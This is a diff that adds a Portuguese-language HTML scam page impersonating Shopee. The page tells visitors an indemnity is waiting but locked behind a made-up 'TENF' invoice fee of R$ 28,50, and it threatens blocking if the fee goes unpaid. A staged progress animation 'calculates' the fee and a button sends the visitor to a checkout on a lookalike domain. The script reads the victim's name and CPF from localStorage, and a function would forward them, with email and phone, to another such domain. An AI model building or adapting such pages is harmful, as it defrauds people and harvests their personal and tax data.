@@ -1,0 +1,158 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+        <script>
+  window.pixelId = "6830e917ec4bfd6b100a124c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Indenização Disponível</title>
+
+    <script src="../assets/js/links.js"></script>
+  <script src="js/latest.html" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial, Helvetica, sans-serif;background-color:#fff;min-height:100vh;display:flex;flex-direction:column}.card,.loading{width:100%;overflow:hidden}.topbar{background-color:#ef4c28;color:#fff;padding:1rem;display:flex;align-items:center;justify-content:space-between;position:relative}.user-info{display:flex;align-items:center;gap:.5rem;font-size:1rem;font-weight:500}.user-info img{width:50px;height:50px}.user-name{position:absolute;top:3rem;left:1.5rem;font-size:1rem;font-weight:600;margin-top:3rem}.icons{display:flex;gap:1.5rem}.icons img{height:24px}.main-header{background-color:#ef4c28;color:#fff;padding:1rem 1.5rem 2.5rem 1.5rem}.indenizacao-info{padding:1rem;text-align:start;color:#000;font-weight:bold}.indenizacao-info h2{font-size:1.1rem;margin-bottom:.5rem;color:#000}.indenizacao-info p{font-size:1.1rem;font-weight:bold;color:#000}.content{padding:1rem}.alert{background-color:#ef4c28;color:#fff;padding:1rem;font-weight:400;margin-bottom:1rem;border-radius:8px;font-size:.9rem}.pendencia{background-color:#efefef;padding:1rem;text-align:center;border-radius:8px;margin-bottom:1.5rem}.pendencia h3{font-size:1rem;margin-bottom:.5rem;font-weight:bold;color:#000}.pendencia p{font-size:.9rem;line-height:1.5;color:#333}.pendencia p strong{color:#000}.button{width:100%;background-color:#00c851;color:#fff;border:none;padding:1rem;font-size:1rem;font-weight:bold;border-radius:10px;cursor:pointer;transition:background-color .3s ease}.button:hover{background-color:#00923c}.loading{display:none;flex-direction:column;align-items:flex-start;justify-content:flex-start;background-color:#fff;padding:1rem 1.5rem;gap:1rem;flex:initial}.loading.active{display:flex}.status-text{font-size:1.2rem;font-weight:600;color:#000;opacity:1;transition:opacity .5s ease}.status-text.fade-out{opacity:0}.progress-bar{width:100%;max-width:400px;height:6px;background-color:#e0e0e0;border-radius:4px;overflow:hidden}.progress-bar-fill{height:100%;width:0%;background-color:#ef4c28;transition:width .1s linear}.final{display:none;flex-direction:column;padding:1.5rem;gap:1.5rem;background-color:#fff}.summary-card{border:2px solid #ef4c28;border-radius:8px;padding:1rem;text-align:center}.summary-card h2{font-size:1rem;color:#000;margin-bottom:.5rem}.summary-card p{font-size:1.2rem;font-weight:bold;color:#000}.info-box{background-color:#efefef;border-radius:8px;padding:1rem;font-size:.9rem;color:#333;line-height:1.5;text-align:center}.final-button{width:100%;background-color:#00c851;color:#fff;border:none;padding:1rem;font-size:1rem;font-weight:bold;border-radius:10px;cursor:pointer;transition:background-color .3s ease}.final-button:hover{background-color:#00923c}</style>
+</head>
+
+<body>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card active" id="card">
+    <div class="topbar">
+      <div class="user-info">
+        <img src="images/user2.svg" alt="Avatar">
+      </div>
+      <div class="icons">
+        <img src="images/3.svg" alt="icons">
+        <img src="images/4.svg" alt="icons">
+        <img src="images/5.svg" alt="icons">
+      </div>
+      <div class="user-name"><strong>Olá, Usuário</strong></div>
+    </div>
+
+    <div class="main-header"></div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="bar"></div>
+      </div>
+      <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
+    </div>
+
+    <div class="content-initial">
+      <div class="indenizacao-info">
+        <h2>Empréstimo disponível</h2>
+        <p>R$ *.***,**</p>
+      </div>
+
+      <div class="content">
+        <div class="alert">
+          Atenção! <strong>Usuário Shopee</strong>, leia a mensagem abaixo para liberar sua indenização
+        </div>
+
+        <div class="pendencia">
+          <h3>Pendência encontrada!</h3>
+          <p>
+            Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de Emissão de Nota Fiscal).</strong> 
+            O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
+            Clique no botão abaixo para calcular sua taxa TENF.
+          </p>
+        </div>
+
+        <button class="button" onclick="calcularTaxa()">Calcular TAXA</button>
+      </div>
+    </div>
+
+    <div class="final" id="final">
+      <div class="summary-card">
+        <h2>TENF (Taxa de Emissão de Nota Fiscal)</h2>
+        <p>R$ 28,50</p>
+      </div>
+
+      <div class="info-box">
+        Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). 
+        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento, 
+        a transferência será feita para sua chave PIX cadastrada. 
+        Caso não conclua o pagamento, sua indenização será bloqueada.
+      </div>
+
+      <a href="https://pay.compraseguraverificada.site/checkout/2087c75d-c1dc-42c5-bd6a-399a41227c8b"><button class="final-button" onclick="">Efetuar o pagamento</button></a>
+    </div>
+  </div>
+
+  <script>
+  // Puxa os dados direto do localStorage
+  const dados = JSON.parse(localStorage.getItem("dadosUsuario")) || {};
+  const cpfRaw = localStorage.getItem("cpfUsuario") || "";
+  const valor = localStorage.getItem("valorIndenizacao") || "R$ 7.854,63";
+
+  const nomeCompleto = dados.NOME || "Usuário Shopee";
+  const primeiroNome = nomeCompleto.trim().split(" ")[0];
+
+  // Atualiza os elementos com o nome
+  document.querySelector(".user-name").innerHTML = `<strong>Olá, ${primeiroNome}</strong>`;
+  document.querySelector(".alert strong").textContent = nomeCompleto;
+
+  // Simula cálculo da taxa (progress bar + mudança de status)
+  function calcularTaxa() {
+    document.querySelector(".content-initial").style.display = "none";
+    document.getElementById("loading").classList.add("active");
+
+    const bar = document.getElementById("bar");
+    const statusText = document.getElementById("status-text");
+    let progress = 0;
+    let trocado = false;
+
+    const interval = setInterval(() => {
+      if (progress >= 100) {
+        clearInterval(interval);
+        document.getElementById("loading").classList.remove("active");
+        document.getElementById("final").style.display = "flex";
+      } else {
+        progress++;
+        bar.style.width = progress + "%";
+
+        if (progress === 70 && !trocado) {
+          trocado = true;
+          statusText.classList.add('fade-out');
+          setTimeout(() => {
+            statusText.textContent = "Gerando seu comprovante...";
+            statusText.classList.remove('fade-out');
+          }, 500);
+        }
+      }
+    }, 30);
+  }
+
+  // Redireciona pro checkout com os dados do localStorage via URL
+  function efetuarPagamento() {
+    const baseUrl = "https://pay.webprotegido.site/checkout/2087c75d-c1dc-42c5-bd6a-399a41227c8b";
+    const params = new URLSearchParams();
+
+    if (nomeCompleto) params.set("name", nomeCompleto);
+    if (cpfRaw) params.set("document", cpfRaw);
+    if (dados.EMAIL) params.set("email", dados.EMAIL);
+    if (dados.TELEFONE) params.set("telephone", dados.TELEFONE);
+
+    window.location.href = `${baseUrl}?${params.toString()}`;
+  }
+</script>
+
+
+<script>window.pixelId="68104c52a3d905d3f8e3b553";var a=document.createElement("script");a.setAttribute("async","");a.setAttribute("defer","");a.setAttribute("src","../../../../cdn.utmify.com.br/scripts/pixel/pixel.js");document.head.appendChild(a);</script>
+
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+
+</body></html>
